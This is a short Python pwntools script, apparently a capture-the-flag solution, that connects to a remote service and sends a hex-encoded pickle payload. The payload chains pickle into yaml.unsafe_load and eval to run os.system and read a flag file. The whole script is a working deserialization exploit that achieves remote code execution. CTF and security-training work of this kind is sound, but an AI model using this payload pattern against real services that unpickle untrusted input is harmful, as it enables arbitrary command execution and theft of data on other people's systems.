from pwn import *
import pickle

io = remote('13.38.208.179', 14385)
# io = process(['python3', './src/app.py'])


bytescodes = '''
cyaml\nunsafe_load\n(S'!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ "__import__('os').system('cat /app/flag.txt')" ]]]'\ntR.
'''.strip().encode()


io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'What is there ?\n', bytescodes.hex().encode())
io.interactive()